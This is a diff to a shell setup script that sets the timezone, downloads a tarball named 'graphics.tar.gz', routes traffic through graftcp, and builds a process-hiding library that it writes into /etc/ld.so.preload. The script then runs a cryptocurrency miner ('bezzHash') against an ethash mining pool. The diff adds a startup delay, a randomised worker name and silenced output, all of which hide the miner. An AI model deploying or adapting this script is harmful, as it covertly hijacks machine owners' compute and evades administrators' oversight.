@@ -1,9 +1,10 @@
 #!/bin/sh
+sleep 15m
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-sleep 10m
+
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
@@ -43,4 +44,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=prodent.LAPI@ethash.kupool.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-DENT)@ethash.kupool.com:443 >/dev/null 2>&1
